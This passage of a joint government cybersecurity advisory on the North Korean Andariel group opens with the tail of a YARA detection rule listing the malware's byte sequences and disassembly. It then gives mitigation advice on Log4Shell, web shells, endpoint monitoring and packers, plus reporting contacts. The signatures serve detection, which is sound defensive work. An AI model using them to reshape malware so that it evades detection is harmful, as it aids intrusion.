//&nbsp; &nbsp;8d8dd4faffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [ebp - 0x52c]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c408&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_4 = { 8855f5 6a5c 8b450c 50 e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8855f5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;byte ptr [ebp - 0xb], dl<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;6a5c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x5c<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; 8b450c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 0xc]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_5 = { 51 e8???????? 83c410 8b558c 52 }<br>&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c410&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b558c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x74]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_6 = { 8b4d0c 51 68???????? 8d9560eaffff 52 e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4d0c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0xc]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;68????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8d9560eaffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, [ebp - 0x15a0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_7 = { 83c001 8945f4 837df420 7d2c 8b4df8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c001&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8945f4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0xc], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;837df420&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0xc], 0x20<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;7d2c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jge&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2e<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4df8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 8]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_8 = { 83c001 89856cf6ffff 8b8d70f6ffff 8a11 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c001&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89856cf6ffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x994], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b8d70f6ffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 0x990]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8a11&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dl, byte ptr [ecx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_9 = { 0355f0 0fb602 0fb64df7 33c1 0fb655fc 33c2 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0355f0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb602&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [edx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb64df7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, byte ptr [ebp - 9]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| xor&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;//&nbsp; &nbsp; 0fb655fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, byte ptr [ebp - 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| xor&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_10 = { d1e9 894df8 8b5518 8955fc c745f000000000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;d1e9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894df8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x18]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 4], edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c745f000000000&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x10], 0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_11 = { 8b4df0 3b4d10 0f8d90000000 8b5508 0355f0 0fb602 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4df0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;3b4d10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f8d90000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jge&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x96<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5508&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0355f0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb602&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [edx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_12 = { 894d14 8b45f8 c1e018 8b4dfc c1e908 0bc1 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894d14&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x14], ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b45f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp - 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e018&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shl&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 0x18<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4dfc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e908&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| or&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_13 = { 0bc1 894518 8b5514 8955f8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| or&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x18], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5514&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x14]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_14 = { 8b5514 8955f8 8b4518 8945fc e9???????? 8be5 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5514&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x14]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 0x18]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8945fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 4], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e9????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8be5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, ebp<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 7 of them and filesize &lt; 1736704<br>}</td>
</tr>
</tbody>
</table>
<h2><strong>Mitigation Measures</strong></h2>
<p>The authoring agencies recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on the threat actors’ activity.</p>
<h3>Log4Shell and Other Log4j Vulnerabilities</h3>
<p>Defenders should consult the joint Cybersecurity Advisory titled “<a href=\"https://media.defense.gov/2021/Dec/22/2002914139/-1/-1/1/JOINT_CSA_MITIGATING_LOG4SHELL_OTHER_LOG4J_VULNERABILITIES_20211222_.PDF\" title=\"Mitigating Log4Shell and Other Log4j-Related Vulnerabilities\">Mitigating Log4Shell and Other Log4j-Related Vulnerabilities</a>” and CISA’s “<a href=\"https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance\" title=\"Apache Log4j Vulnerability Guidance\">Apache Log4j Vulnerability</a>” guidance. Organizations can mitigate the risks posed by the vulnerability by identifying assets affected by Log4Shell and other Log4j-related vulnerabilities and upgrading Log4j assets and affected products to the latest version.&nbsp;</p>
<p><strong>Note:</strong> CVE-2021-44228 ‘Log4Shell’ was disclosed in December 2021 and affects the Log4j library prior to version 2.17.0.</p>
<p>Defenders should remain alert to vendor software updates, and initiate hunt and incident response procedures to detect possible Log4Shell exploitation.</p>
<h3>Web Shell Malware</h3>
<p>Web shell malware is deployed by adversaries on a victim’s web server to execute arbitrary system commands. The NSA and Australian Signals Directorate’s report titled “<a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" title=\"Detect and Prevent Web Shell Malware\">Detect and Prevent Web Shell Malware</a>” provides mitigating actions to identify and recover from web shells.</p>
<p>Preventing exploitation of web-facing servers often depends on maintaining an inventory of systems and applications, rapidly applying patches as they are released, putting vulnerable or potentially risky systems behind reverse proxies that require authentication, and deploying and configuring Web Application Firewalls (WAFs).</p>
<h3>Endpoint Activity</h3>
<p>Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms, blocking unnecessary outbound connections, blocking external access to administrator panels and services or turning them off entirely, and segmenting the network to prevent lateral movement from a compromised web server to critical assets.</p>
<h3>Command Line Activity and Remote Access</h3>
<p>Monitoring for suspicious command-line activity, implementing multi-factor authentication for remote access services, and properly segmenting and using allow-listing tools for critical assets can protect against malicious activity by RGB 3rd Bureau’s Andariel group and other cyber threat actors.</p>
<h3><strong>Packing</strong></h3>
<p>Signatures for Themida, VMProtect and a number of other packers are available <a href=\"https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar\" title=\"ditekshen / detection\">here</a>, however, the signatures will not identify every file packed using these applications.</p>
<h3>Additional Mitigation Measures for Malicious Activities</h3>
<ul>
<li>Check for security vulnerabilities, apply patches, and update to the latest version of software</li>
<li>Encrypt all sensitive data including personal information</li>
<li>Block access to unused ports</li>
<li>Change passwords when they are suspected of being compromised</li>
<li>Alert on unexpected use of dual-use applications</li>
<li>Strengthen the subscriber identity authentication process for leased servers</li>
</ul>
<h3>DPRK Rewards for Justice</h3>
<p>The U.S. and ROK Governments encourage victims to report suspicious activities, including those related to suspected DPRK cyber activities, to relevant authorities. If you provide information about illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a reward. If you have information about illicit DPRK activities in cyberspace, including past or ongoing operations, providing such information through the Department of State’s Rewards for Justice program could make you eligible to receive an award of up to $10 million. For further details, please visit <a href=\"https://rewardsforjustice.net/\" title=\"Rewards for Justice – Intelligence-Driven Law Enforcement\">https://rewardsforjustice.net/</a>.</p>
<h2><strong>Acknowledgements</strong></h2>
<p>Mandiant and Microsoft Threat Intelligence contributed to this CSA.</p>
<h3>Disclaimer of Endorsement</h3>
<p>Your organization has no obligation to respond or provide information in response to this product. &nbsp;If, after reviewing the information provided, your organization decides to provide information to the authorizing agencies, it must do so consistent with applicable state and federal law.</p>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or service by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the co-authors.</p>
<h3>Version History</h3>
<p>July 25, 2024: Initial version.</p>
<p>August 6, 2024: Updated “Credential Access” and “Commodity Malware and Dual-Use Applications” sections.</p>
<h3>Trademark Recognition</h3>
<p>Active Directory®, Microsoft®, PowerShell®, and Windows® are registered trademarks of Microsoft Corporation. MITRE® and ATT&amp;CK® are registered trademarks of The MITRE Corporation.</p>
<h3>Purpose</h3>
<p>This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.</p>
<h3>Contact</h3>
<p><strong>U.S. organizations:</strong> Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or cisa.gov/report or to the FBI via your local FBI field office listed at <a href=\"https://www.fbi.gov/contact-us/fieldoffices\" title=\"Field Offices\">https://www.fbi.gov/contact-us/fieldoffices</a>.</p>
<p><strong>DC3 Cyber Forensics Laboratory (CFL):&nbsp;</strong><a href=\"mailto:afosi.dc3.cflintake@us.af.mil\" title=\"DC3 Cyber Forensics Laboratory\">afosi.dc3.cflintake@us.af.mil</a></p>
<p><strong>DoD-Defense Industrial Base (DIB) Collaborative Information Sharing Environment (DCISE):&nbsp;</strong><a href=\"mailto:dc3.dcise@us.af.mil\" title=\"DoD-Defense Industrial Base Collaborative Information Sharing Environment\">dc3.dcise@us.af.mil</a></p>
<p><strong>NSA Cybersecurity Report Questions and Feedback:&nbsp;</strong><a href=\"mailto:CybersecurityReports@nsa.gov\" title=\"NSA Cybersecurity Report Questions and Feedback\">CybersecurityReports@nsa.gov</a></p>
